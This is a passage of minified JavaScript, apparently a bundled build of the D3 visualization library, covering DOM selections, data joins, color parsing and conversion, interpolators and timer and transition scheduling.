il="http://www.w3.org/1999/xhtml";const Wc={svg:"http://www.w3.org/2000/svg",xhtml:il,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function Ni(e){var n=e+="",t=n.indexOf(":");return t>=0&&(n=e.slice(0,t))!=="xmlns"&&(e=e.slice(t+1)),Wc.hasOwnProperty(n)?{space:Wc[n],local:e}:e}function vy(e){return function(){var n=this.ownerDocument,t=this.namespaceURI;return t===il&&n.documentElement.namespaceURI===il?n.createElement(e):n.createElementNS(t,e)}}function wy(e){return function(){return this.ownerDocument.createElementNS(e.space,e.local)}}function zd(e){var n=Ni(e);return(n.local?wy:vy)(n)}function ky(){}function ho(e){return e==null?ky:function(){return this.querySelector(e)}}function by(e){typeof e!="function"&&(e=ho(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=new Array(a),o,c,u=0;u<a;++u)(o=i[u])&&(c=e.call(o,o.__data__,u,i))&&("__data__"in o&&(c.__data__=o.__data__),l[u]=c);return new Ie(s,this._parents)}function xy(e){return e==null?[]:Array.isArray(e)?e:Array.from(e)}function _y(){return[]}function Dd(e){return e==null?_y:function(){return this.querySelectorAll(e)}}function Sy(e){return function(){return xy(e.apply(this,arguments))}}function Ey(e){typeof e=="function"?e=Sy(e):e=Dd(e);for(var n=this._groups,t=n.length,s=[],r=[],i=0;i<t;++i)for(var a=n[i],l=a.length,o,c=0;c<l;++c)(o=a[c])&&(s.push(e.call(o,o.__data__,c,a)),r.push(o));return new Ie(s,r)}function jd(e){return function(){return this.matches(e)}}function Bd(e){return function(n){return n.matches(e)}}var Ty=Array.prototype.find;function Cy(e){return function(){return Ty.call(this.children,e)}}function Ay(){return this.firstElementChild}function Py(e){return this.select(e==null?Ay:Cy(typeof e=="function"?e:Bd(e)))}var Ny=Array.prototype.filter;function Ly(){return Array.from(this.children)}function Ry(e){return function(){return Ny.call(this.children,e)}}function Oy(e){return this.selectAll(e==null?Ly:Ry(typeof e=="function"?e:Bd(e)))}function My(e){typeof e!="function"&&(e=jd(e));for(var n=this._groups,t=n.length,s=new Array(t),r=0;r<t;++r)for(var i=n[r],a=i.length,l=s[r]=[],o,c=0;c<a;++c)(o=i[c])&&e.call(o,o.__data__,c,i)&&l.push(o);return new Ie(s,this._parents)}function Fd(e){return new Array(e.length)}function Iy(){return new Ie(this._enter||this._groups.map(Fd),this._parents)}function ai(e,n){this.ownerDocument=e.ownerDocument,this.namespaceURI=e.namespaceURI,this._next=null,this._parent=e,this.__data__=n}ai.prototype={constructor:ai,appendChild:function(e){return this._parent.insertBefore(e,this._next)},insertBefore:function(e,n){return this._parent.insertBefore(e,n)},querySelector:function(e){return this._parent.querySelector(e)},querySelectorAll:function(e){return this._parent.querySelectorAll(e)}};function zy(e){return function(){return e}}function Dy(e,n,t,s,r,i){for(var a=0,l,o=n.length,c=i.length;a<c;++a)(l=n[a])?(l.__data__=i[a],s[a]=l):t[a]=new ai(e,i[a]);for(;a<o;++a)(l=n[a])&&(r[a]=l)}function jy(e,n,t,s,r,i,a){var l,o,c=new Map,u=n.length,h=i.length,f=new Array(u),g;for(l=0;l<u;++l)(o=n[l])&&(f[l]=g=a.call(o,o.__data__,l,n)+"",c.has(g)?r[l]=o:c.set(g,o));for(l=0;l<h;++l)g=a.call(e,i[l],l,i)+"",(o=c.get(g))?(s[l]=o,o.__data__=i[l],c.delete(g)):t[l]=new ai(e,i[l]);for(l=0;l<u;++l)(o=n[l])&&c.get(f[l])===o&&(r[l]=o)}function By(e){return e.__data__}function Fy(e,n){if(!arguments.length)return Array.from(this,By);var t=n?jy:Dy,s=this._parents,r=this._groups;typeof e!="function"&&(e=zy(e));for(var i=r.length,a=new Array(i),l=new Array(i),o=new Array(i),c=0;c<i;++c){var u=s[c],h=r[c],f=h.length,g=Uy(e.call(u,u&&u.__data__,c,s)),k=g.length,y=l[c]=new Array(k),w=a[c]=new Array(k),d=o[c]=new Array(f);t(u,h,y,w,d,g,n);for(var p=0,m=0,v,x;p<k;++p)if(v=y[p]){for(p>=m&&(m=p+1);!(x=w[m])&&++m<k;);v._next=x||null}}return a=new Ie(a,s),a._enter=l,a._exit=o,a}function Uy(e){return typeof e=="object"&&"length"in e?e:Array.from(e)}function Hy(){return new Ie(this._exit||this._groups.map(Fd),this._parents)}function Vy(e,n,t){var s=this.enter(),r=this,i=this.exit();return typeof e=="function"?(s=e(s),s&&(s=s.selection())):s=s.append(e+""),n!=null&&(r=n(r),r&&(r=r.selection())),t==null?i.remove():t(i),s&&r?s.merge(r).order():r}function Wy(e){for(var n=e.selection?e.selection():e,t=this._groups,s=n._groups,r=t.length,i=s.length,a=Math.min(r,i),l=new Array(r),o=0;o<a;++o)for(var c=t[o],u=s[o],h=c.length,f=l[o]=new Array(h),g,k=0;k<h;++k)(g=c[k]||u[k])&&(f[k]=g);for(;o<r;++o)l[o]=t[o];return new Ie(l,this._parents)}function $y(){for(var e=this._groups,n=-1,t=e.length;++n<t;)for(var s=e[n],r=s.length-1,i=s[r],a;--r>=0;)(a=s[r])&&(i&&a.compareDocumentPosition(i)^4&&i.parentNode.insertBefore(a,i),i=a);return this}function Gy(e){e||(e=Yy);function n(h,f){return h&&f?e(h.__data__,f.__data__):!h-!f}for(var t=this._groups,s=t.length,r=new Array(s),i=0;i<s;++i){for(var a=t[i],l=a.length,o=r[i]=new Array(l),c,u=0;u<l;++u)(c=a[u])&&(o[u]=c);o.sort(n)}return new Ie(r,this._parents).order()}function Yy(e,n){return e<n?-1:e>n?1:e>=n?0:NaN}function qy(){var e=arguments[0];return arguments[0]=this,e.apply(null,arguments),this}function Xy(){return Array.from(this)}function Ky(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length;r<i;++r){var a=s[r];if(a)return a}return null}function Qy(){let e=0;for(const n of this)++e;return e}function Zy(){return!this.node()}function Jy(e){for(var n=this._groups,t=0,s=n.length;t<s;++t)for(var r=n[t],i=0,a=r.length,l;i<a;++i)(l=r[i])&&e.call(l,l.__data__,i,r);return this}function ev(e){return function(){this.removeAttribute(e)}}function nv(e){return function(){this.removeAttributeNS(e.space,e.local)}}function tv(e,n){return function(){this.setAttribute(e,n)}}function sv(e,n){return function(){this.setAttributeNS(e.space,e.local,n)}}function rv(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttribute(e):this.setAttribute(e,t)}}function iv(e,n){return function(){var t=n.apply(this,arguments);t==null?this.removeAttributeNS(e.space,e.local):this.setAttributeNS(e.space,e.local,t)}}function av(e,n){var t=Ni(e);if(arguments.length<2){var s=this.node();return t.local?s.getAttributeNS(t.space,t.local):s.getAttribute(t)}return this.each((n==null?t.local?nv:ev:typeof n=="function"?t.local?iv:rv:t.local?sv:tv)(t,n))}function Ud(e){return e.ownerDocument&&e.ownerDocument.defaultView||e.document&&e||e.defaultView}function lv(e){return function(){this.style.removeProperty(e)}}function ov(e,n,t){return function(){this.style.setProperty(e,n,t)}}function cv(e,n,t){return function(){var s=n.apply(this,arguments);s==null?this.style.removeProperty(e):this.style.setProperty(e,s,t)}}function uv(e,n,t){return arguments.length>1?this.each((n==null?lv:typeof n=="function"?cv:ov)(e,n,t??"")):Vt(this.node(),e)}function Vt(e,n){return e.style.getPropertyValue(n)||Ud(e).getComputedStyle(e,null).getPropertyValue(n)}function pv(e){return function(){delete this[e]}}function dv(e,n){return function(){this[e]=n}}function hv(e,n){return function(){var t=n.apply(this,arguments);t==null?delete this[e]:this[e]=t}}function fv(e,n){return arguments.length>1?this.each((n==null?pv:typeof n=="function"?hv:dv)(e,n)):this.node()[e]}function Hd(e){return e.trim().split(/^|\s+/)}function fo(e){return e.classList||new Vd(e)}function Vd(e){this._node=e,this._names=Hd(e.getAttribute("class")||"")}Vd.prototype={add:function(e){var n=this._names.indexOf(e);n<0&&(this._names.push(e),this._node.setAttribute("class",this._names.join(" ")))},remove:function(e){var n=this._names.indexOf(e);n>=0&&(this._names.splice(n,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(e){return this._names.indexOf(e)>=0}};function Wd(e,n){for(var t=fo(e),s=-1,r=n.length;++s<r;)t.add(n[s])}function $d(e,n){for(var t=fo(e),s=-1,r=n.length;++s<r;)t.remove(n[s])}function mv(e){return function(){Wd(this,e)}}function gv(e){return function(){$d(this,e)}}function yv(e,n){return function(){(n.apply(this,arguments)?Wd:$d)(this,e)}}function vv(e,n){var t=Hd(e+"");if(arguments.length<2){for(var s=fo(this.node()),r=-1,i=t.length;++r<i;)if(!s.contains(t[r]))return!1;return!0}return this.each((typeof n=="function"?yv:n?mv:gv)(t,n))}function wv(){this.textContent=""}function kv(e){return function(){this.textContent=e}}function bv(e){return function(){var n=e.apply(this,arguments);this.textContent=n??""}}function xv(e){return arguments.length?this.each(e==null?wv:(typeof e=="function"?bv:kv)(e)):this.node().textContent}function _v(){this.innerHTML=""}function Sv(e){return function(){this.innerHTML=e}}function Ev(e){return function(){var n=e.apply(this,arguments);this.innerHTML=n??""}}function Tv(e){return arguments.length?this.each(e==null?_v:(typeof e=="function"?Ev:Sv)(e)):this.node().innerHTML}function Cv(){this.nextSibling&&this.parentNode.appendChild(this)}function Av(){return this.each(Cv)}function Pv(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function Nv(){return this.each(Pv)}function Lv(e){var n=typeof e=="function"?e:zd(e);return this.select(function(){return this.appendChild(n.apply(this,arguments))})}function Rv(){return null}function Ov(e,n){var t=typeof e=="function"?e:zd(e),s=n==null?Rv:typeof n=="function"?n:ho(n);return this.select(function(){return this.insertBefore(t.apply(this,arguments),s.apply(this,arguments)||null)})}function Mv(){var e=this.parentNode;e&&e.removeChild(this)}function Iv(){return this.each(Mv)}function zv(){var e=this.cloneNode(!1),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function Dv(){var e=this.cloneNode(!0),n=this.parentNode;return n?n.insertBefore(e,this.nextSibling):e}function jv(e){return this.select(e?Dv:zv)}function Bv(e){return arguments.length?this.property("__data__",e):this.node().__data__}function Fv(e){return function(n){e.call(this,n,this.__data__)}}function Uv(e){return e.trim().split(/^|\s+/).map(function(n){var t="",s=n.indexOf(".");return s>=0&&(t=n.slice(s+1),n=n.slice(0,s)),{type:n,name:t}})}function Hv(e){return function(){var n=this.__on;if(n){for(var t=0,s=-1,r=n.length,i;t<r;++t)i=n[t],(!e.type||i.type===e.type)&&i.name===e.name?this.removeEventListener(i.type,i.listener,i.options):n[++s]=i;++s?n.length=s:delete this.__on}}}function Vv(e,n,t){return function(){var s=this.__on,r,i=Fv(n);if(s){for(var a=0,l=s.length;a<l;++a)if((r=s[a]).type===e.type&&r.name===e.name){this.removeEventListener(r.type,r.listener,r.options),this.addEventListener(r.type,r.listener=i,r.options=t),r.value=n;return}}this.addEventListener(e.type,i,t),r={type:e.type,name:e.name,value:n,listener:i,options:t},s?s.push(r):this.__on=[r]}}function Wv(e,n,t){var s=Uv(e+""),r,i=s.length,a;if(arguments.length<2){var l=this.node().__on;if(l){for(var o=0,c=l.length,u;o<c;++o)for(r=0,u=l[o];r<i;++r)if((a=s[r]).type===u.type&&a.name===u.name)return u.value}return}for(l=n?Vv:Hv,r=0;r<i;++r)this.each(l(s[r],n,t));return this}function Gd(e,n,t){var s=Ud(e),r=s.CustomEvent;typeof r=="function"?r=new r(n,t):(r=s.document.createEvent("Event"),t?(r.initEvent(n,t.bubbles,t.cancelable),r.detail=t.detail):r.initEvent(n,!1,!1)),e.dispatchEvent(r)}function $v(e,n){return function(){return Gd(this,e,n)}}function Gv(e,n){return function(){return Gd(this,e,n.apply(this,arguments))}}function Yv(e,n){return this.each((typeof n=="function"?Gv:$v)(e,n))}function*qv(){for(var e=this._groups,n=0,t=e.length;n<t;++n)for(var s=e[n],r=0,i=s.length,a;r<i;++r)(a=s[r])&&(yield a)}var Yd=[null];function Ie(e,n){this._groups=e,this._parents=n}function Ks(){return new Ie([[document.documentElement]],Yd)}function Xv(){return this}Ie.prototype=Ks.prototype={constructor:Ie,select:by,selectAll:Ey,selectChild:Py,selectChildren:Oy,filter:My,data:Fy,enter:Iy,exit:Hy,join:Vy,merge:Wy,selection:Xv,order:$y,sort:Gy,call:qy,nodes:Xy,node:Ky,size:Qy,empty:Zy,each:Jy,attr:av,style:uv,property:fv,classed:vv,text:xv,html:Tv,raise:Av,lower:Nv,append:Lv,insert:Ov,remove:Iv,clone:jv,datum:Bv,on:Wv,dispatch:Yv,[Symbol.iterator]:qv};function pn(e){return typeof e=="string"?new Ie([[document.querySelector(e)]],[document.documentElement]):new Ie([[e]],Yd)}function Kv(e){let n;for(;n=e.sourceEvent;)e=n;return e}function qn(e,n){if(e=Kv(e),n===void 0&&(n=e.currentTarget),n){var t=n.ownerSVGElement||n;if(t.createSVGPoint){var s=t.createSVGPoint();return s.x=e.clientX,s.y=e.clientY,s=s.matrixTransform(n.getScreenCTM().inverse()),[s.x,s.y]}if(n.getBoundingClientRect){var r=n.getBoundingClientRect();return[e.clientX-r.left-n.clientLeft,e.clientY-r.top-n.clientTop]}}return[e.pageX,e.pageY]}const al={capture:!0,passive:!1};function ll(e){e.preventDefault(),e.stopImmediatePropagation()}function Qv(e){var n=e.document.documentElement,t=pn(e).on("dragstart.drag",ll,al);"onselectstart"in n?t.on("selectstart.drag",ll,al):(n.__noselect=n.style.MozUserSelect,n.style.MozUserSelect="none")}function Zv(e,n){var t=e.document.documentElement,s=pn(e).on("dragstart.drag",null);n&&(s.on("click.drag",ll,al),setTimeout(function(){s.on("click.drag",null)},0)),"onselectstart"in t?s.on("selectstart.drag",null):(t.style.MozUserSelect=t.__noselect,delete t.__noselect)}function mo(e,n,t){e.prototype=n.prototype=t,t.constructor=e}function qd(e,n){var t=Object.create(e.prototype);for(var s in n)t[s]=n[s];return t}function Qs(){}var Bs=.7,li=1/Bs,It="\\s*([+-]?\\d+)\\s*",Fs="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)\\s*",rn="\\s*([+-]?(?:\\d*\\.)?\\d+(?:[eE][+-]?\\d+)?)%\\s*",Jv=/^#([0-9a-f]{3,8})$/,e0=new RegExp(`^rgb\\(${It},${It},${It}\\)$`),n0=new RegExp(`^rgb\\(${rn},${rn},${rn}\\)$`),t0=new RegExp(`^rgba\\(${It},${It},${It},${Fs}\\)$`),s0=new RegExp(`^rgba\\(${rn},${rn},${rn},${Fs}\\)$`),r0=new RegExp(`^hsl\\(${Fs},${rn},${rn}\\)$`),i0=new RegExp(`^hsla\\(${Fs},${rn},${rn},${Fs}\\)$`),$c={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};mo(Qs,Us,{copy(e){return Object.assign(new this.constructor,this,e)},displayable(){return this.rgb().displayable()},hex:Gc,formatHex:Gc,formatHex8:a0,formatHsl:l0,formatRgb:Yc,toString:Yc});function Gc(){return this.rgb().formatHex()}function a0(){return this.rgb().formatHex8()}function l0(){return Xd(this).formatHsl()}function Yc(){return this.rgb().formatRgb()}function Us(e){var n,t;return e=(e+"").trim().toLowerCase(),(n=Jv.exec(e))?(t=n[1].length,n=parseInt(n[1],16),t===6?qc(n):t===3?new Ce(n>>8&15|n>>4&240,n>>4&15|n&240,(n&15)<<4|n&15,1):t===8?mr(n>>24&255,n>>16&255,n>>8&255,(n&255)/255):t===4?mr(n>>12&15|n>>8&240,n>>8&15|n>>4&240,n>>4&15|n&240,((n&15)<<4|n&15)/255):null):(n=e0.exec(e))?new Ce(n[1],n[2],n[3],1):(n=n0.exec(e))?new Ce(n[1]*255/100,n[2]*255/100,n[3]*255/100,1):(n=t0.exec(e))?mr(n[1],n[2],n[3],n[4]):(n=s0.exec(e))?mr(n[1]*255/100,n[2]*255/100,n[3]*255/100,n[4]):(n=r0.exec(e))?Qc(n[1],n[2]/100,n[3]/100,1):(n=i0.exec(e))?Qc(n[1],n[2]/100,n[3]/100,n[4]):$c.hasOwnProperty(e)?qc($c[e]):e==="transparent"?new Ce(NaN,NaN,NaN,0):null}function qc(e){return new Ce(e>>16&255,e>>8&255,e&255,1)}function mr(e,n,t,s){return s<=0&&(e=n=t=NaN),new Ce(e,n,t,s)}function o0(e){return e instanceof Qs||(e=Us(e)),e?(e=e.rgb(),new Ce(e.r,e.g,e.b,e.opacity)):new Ce}function ol(e,n,t,s){return arguments.length===1?o0(e):new Ce(e,n,t,s??1)}function Ce(e,n,t,s){this.r=+e,this.g=+n,this.b=+t,this.opacity=+s}mo(Ce,ol,qd(Qs,{brighter(e){return e=e==null?li:Math.pow(li,e),new Ce(this.r*e,this.g*e,this.b*e,this.opacity)},darker(e){return e=e==null?Bs:Math.pow(Bs,e),new Ce(this.r*e,this.g*e,this.b*e,this.opacity)},rgb(){return this},clamp(){return new Ce(st(this.r),st(this.g),st(this.b),oi(this.opacity))},displayable(){return-.5<=this.r&&this.r<255.5&&-.5<=this.g&&this.g<255.5&&-.5<=this.b&&this.b<255.5&&0<=this.opacity&&this.opacity<=1},hex:Xc,formatHex:Xc,formatHex8:c0,formatRgb:Kc,toString:Kc}));function Xc(){return`#${et(this.r)}${et(this.g)}${et(this.b)}`}function c0(){return`#${et(this.r)}${et(this.g)}${et(this.b)}${et((isNaN(this.opacity)?1:this.opacity)*255)}`}function Kc(){const e=oi(this.opacity);return`${e===1?"rgb(":"rgba("}${st(this.r)}, ${st(this.g)}, ${st(this.b)}${e===1?")":`, ${e})`}`}function oi(e){return isNaN(e)?1:Math.max(0,Math.min(1,e))}function st(e){return Math.max(0,Math.min(255,Math.round(e)||0))}function et(e){return e=st(e),(e<16?"0":"")+e.toString(16)}function Qc(e,n,t,s){return s<=0?e=n=t=NaN:t<=0||t>=1?e=n=NaN:n<=0&&(e=NaN),new qe(e,n,t,s)}function Xd(e){if(e instanceof qe)return new qe(e.h,e.s,e.l,e.opacity);if(e instanceof Qs||(e=Us(e)),!e)return new qe;if(e instanceof qe)return e;e=e.rgb();var n=e.r/255,t=e.g/255,s=e.b/255,r=Math.min(n,t,s),i=Math.max(n,t,s),a=NaN,l=i-r,o=(i+r)/2;return l?(n===i?a=(t-s)/l+(t<s)*6:t===i?a=(s-n)/l+2:a=(n-t)/l+4,l/=o<.5?i+r:2-i-r,a*=60):l=o>0&&o<1?0:a,new qe(a,l,o,e.opacity)}function u0(e,n,t,s){return arguments.length===1?Xd(e):new qe(e,n,t,s??1)}function qe(e,n,t,s){this.h=+e,this.s=+n,this.l=+t,this.opacity=+s}mo(qe,u0,qd(Qs,{brighter(e){return e=e==null?li:Math.pow(li,e),new qe(this.h,this.s,this.l*e,this.opacity)},darker(e){return e=e==null?Bs:Math.pow(Bs,e),new qe(this.h,this.s,this.l*e,this.opacity)},rgb(){var e=this.h%360+(this.h<0)*360,n=isNaN(e)||isNaN(this.s)?0:this.s,t=this.l,s=t+(t<.5?t:1-t)*n,r=2*t-s;return new Ce(la(e>=240?e-240:e+120,r,s),la(e,r,s),la(e<120?e+240:e-120,r,s),this.opacity)},clamp(){return new qe(Zc(this.h),gr(this.s),gr(this.l),oi(this.opacity))},displayable(){return(0<=this.s&&this.s<=1||isNaN(this.s))&&0<=this.l&&this.l<=1&&0<=this.opacity&&this.opacity<=1},formatHsl(){const e=oi(this.opacity);return`${e===1?"hsl(":"hsla("}${Zc(this.h)}, ${gr(this.s)*100}%, ${gr(this.l)*100}%${e===1?")":`, ${e})`}`}}));function Zc(e){return e=(e||0)%360,e<0?e+360:e}function gr(e){return Math.max(0,Math.min(1,e||0))}function la(e,n,t){return(e<60?n+(t-n)*e/60:e<180?t:e<240?n+(t-n)*(240-e)/60:n)*255}const Kd=e=>()=>e;function p0(e,n){return function(t){return e+t*n}}function d0(e,n,t){return e=Math.pow(e,t),n=Math.pow(n,t)-e,t=1/t,function(s){return Math.pow(e+s*n,t)}}function h0(e){return(e=+e)==1?Qd:function(n,t){return t-n?d0(n,t,e):Kd(isNaN(n)?t:n)}}function Qd(e,n){var t=n-e;return t?p0(e,t):Kd(isNaN(e)?n:e)}const Jc=function e(n){var t=h0(n);function s(r,i){var a=t((r=ol(r)).r,(i=ol(i)).r),l=t(r.g,i.g),o=t(r.b,i.b),c=Qd(r.opacity,i.opacity);return function(u){return r.r=a(u),r.g=l(u),r.b=o(u),r.opacity=c(u),r+""}}return s.gamma=e,s}(1);function Tn(e,n){return e=+e,n=+n,function(t){return e*(1-t)+n*t}}var cl=/[-+]?(?:\d+\.?\d*|\.?\d+)(?:[eE][-+]?\d+)?/g,oa=new RegExp(cl.source,"g");function f0(e){return function(){return e}}function m0(e){return function(n){return e(n)+""}}function g0(e,n){var t=cl.lastIndex=oa.lastIndex=0,s,r,i,a=-1,l=[],o=[];for(e=e+"",n=n+"";(s=cl.exec(e))&&(r=oa.exec(n));)(i=r.index)>t&&(i=n.slice(t,i),l[a]?l[a]+=i:l[++a]=i),(s=s[0])===(r=r[0])?l[a]?l[a]+=r:l[++a]=r:(l[++a]=null,o.push({i:a,x:Tn(s,r)})),t=oa.lastIndex;return t<n.length&&(i=n.slice(t),l[a]?l[a]+=i:l[++a]=i),l.length<2?o[0]?m0(o[0].x):f0(n):(n=o.length,function(c){for(var u=0,h;u<n;++u)l[(h=o[u]).i]=h.x(c);return l.join("")})}var eu=180/Math.PI,ul={translateX:0,translateY:0,rotate:0,skewX:0,scaleX:1,scaleY:1};function Zd(e,n,t,s,r,i){var a,l,o;return(a=Math.sqrt(e*e+n*n))&&(e/=a,n/=a),(o=e*t+n*s)&&(t-=e*o,s-=n*o),(l=Math.sqrt(t*t+s*s))&&(t/=l,s/=l,o/=l),e*s<n*t&&(e=-e,n=-n,o=-o,a=-a),{translateX:r,translateY:i,rotate:Math.atan2(n,e)*eu,skewX:Math.atan(o)*eu,scaleX:a,scaleY:l}}var yr;function y0(e){const n=new(typeof DOMMatrix=="function"?DOMMatrix:WebKitCSSMatrix)(e+"");return n.isIdentity?ul:Zd(n.a,n.b,n.c,n.d,n.e,n.f)}function v0(e){return e==null||(yr||(yr=document.createElementNS("http://www.w3.org/2000/svg","g")),yr.setAttribute("transform",e),!(e=yr.transform.baseVal.consolidate()))?ul:(e=e.matrix,Zd(e.a,e.b,e.c,e.d,e.e,e.f))}function Jd(e,n,t,s){function r(c){return c.length?c.pop()+" ":""}function i(c,u,h,f,g,k){if(c!==h||u!==f){var y=g.push("translate(",null,n,null,t);k.push({i:y-4,x:Tn(c,h)},{i:y-2,x:Tn(u,f)})}else(h||f)&&g.push("translate("+h+n+f+t)}function a(c,u,h,f){c!==u?(c-u>180?u+=360:u-c>180&&(c+=360),f.push({i:h.push(r(h)+"rotate(",null,s)-2,x:Tn(c,u)})):u&&h.push(r(h)+"rotate("+u+s)}function l(c,u,h,f){c!==u?f.push({i:h.push(r(h)+"skewX(",null,s)-2,x:Tn(c,u)}):u&&h.push(r(h)+"skewX("+u+s)}function o(c,u,h,f,g,k){if(c!==h||u!==f){var y=g.push(r(g)+"scale(",null,",",null,")");k.push({i:y-4,x:Tn(c,h)},{i:y-2,x:Tn(u,f)})}else(h!==1||f!==1)&&g.push(r(g)+"scale("+h+","+f+")")}return function(c,u){var h=[],f=[];return c=e(c),u=e(u),i(c.translateX,c.translateY,u.translateX,u.translateY,h,f),a(c.rotate,u.rotate,h,f),l(c.skewX,u.skewX,h,f),o(c.scaleX,c.scaleY,u.scaleX,u.scaleY,h,f),c=u=null,function(g){for(var k=-1,y=f.length,w;++k<y;)h[(w=f[k]).i]=w.x(g);return h.join("")}}}var w0=Jd(y0,"px, ","px)","deg)"),k0=Jd(v0,", ",")",")"),b0=1e-12;function nu(e){return((e=Math.exp(e))+1/e)/2}function x0(e){return((e=Math.exp(e))-1/e)/2}function _0(e){return((e=Math.exp(2*e))-1)/(e+1)}const S0=function e(n,t,s){function r(i,a){var l=i[0],o=i[1],c=i[2],u=a[0],h=a[1],f=a[2],g=u-l,k=h-o,y=g*g+k*k,w,d;if(y<b0)d=Math.log(f/c)/n,w=function(P){return[l+P*g,o+P*k,c*Math.exp(n*P*d)]};else{var p=Math.sqrt(y),m=(f*f-c*c+s*y)/(2*c*t*p),v=(f*f-c*c-s*y)/(2*f*t*p),x=Math.log(Math.sqrt(m*m+1)-m),T=Math.log(Math.sqrt(v*v+1)-v);d=(T-x)/n,w=function(P){var N=P*d,j=nu(x),M=c/(t*p)*(j*_0(n*N+x)-x0(x));return[l+M*g,o+M*k,c*j/nu(n*N+x)]}}return w.duration=d*1e3*n/Math.SQRT2,w}return r.rho=function(i){var a=Math.max(.001,+i),l=a*a,o=l*l;return e(a,l,o)},r}(Math.SQRT2,2,4);var Wt=0,cs=0,ss=0,eh=1e3,ci,us,ui=0,ut=0,Li=0,Hs=typeof performance=="object"&&performance.now?performance:Date,nh=typeof window=="object"&&window.requestAnimationFrame?window.requestAnimationFrame.bind(window):function(e){setTimeout(e,17)};function go(){return ut||(nh(E0),ut=Hs.now()+Li)}function E0(){ut=0}function pi(){this._call=this._time=this._next=null}pi.prototype=yo.prototype={constructor:pi,restart:function(e,n,t){if(typeof e!="function")throw new TypeError("callback is not a function");t=(t==null?go():+t)+(n==null?0:+n),!this._next&&us!==this&&(us?us._next=this:ci=this,us=this),this._call=e,this._time=t,pl()},stop:function(){this._call&&(this._call=null,this._time=1/0,pl())}};function yo(e,n,t){var s=new pi;return s.restart(e,n,t),s}function T0(){go(),++Wt;for(var e=ci,n;e;)(n=ut-e._time)>=0&&e._call.call(void 0,n),e=e._next;--Wt}function tu(){ut=(ui=Hs.now())+Li,Wt=cs=0;try{T0()}finally{Wt=0,A0(),ut=0}}function C0(){var e=Hs.now(),n=e-ui;n>eh&&(Li-=n,ui=e)}function A0(){for(var e,n=ci,t,s=1/0;n;)n._call?(s>n._time&&(s=n._time),e=n,n=n._next):(t=n._next,n._next=null,n=e?e._next=t:ci=t);us=e,pl(s)}function pl(e){if(!Wt){cs&&(cs=clearTimeout(cs));var n=e-ut;n>24?(e<1/0&&(cs=setTimeout(tu,e-Hs.now()-Li)),ss&&(ss=clearInterval(ss))):(ss||(ui=Hs.now(),ss=setInterval(C0,eh)),Wt=1,nh(tu))}}function su(e,n,t){var s=new pi;return n=n==null?0:+n,s.restart(r=>{s.stop(),e(r+n)},n,t),s}var P0=Pi("start","end","cancel","interrupt"),N0=[],th=0,ru=1,dl=2,Rr=3,iu=4,hl=5,Or=6;function Ri(e,n,t,s,r,i){var a=e.__transition;if(!a)e.__transition={};else if(t in a)return;L0(e,t,{name:n,index:s,group:r,on:P0,tween:N0,time:i.time,delay:i.delay,duration:i.duration,ease:i.ease,timer:null,state:th})}function vo(e,n){var t=Ze(e,n);if(t.state>th)throw new Error("too late; already scheduled");return t}function an(e,n){var t=Ze(e,n);if(t.state>Rr)throw new Error("too late; already running");return t}function Ze(e,n){var t=e.__transition;if(!t||!(t=t[n]))throw new Error("transition not found");return t}function L0(e,n,t){var s=e.__transition,r;s[n]=t,t.timer=yo(i,0,t.time);function 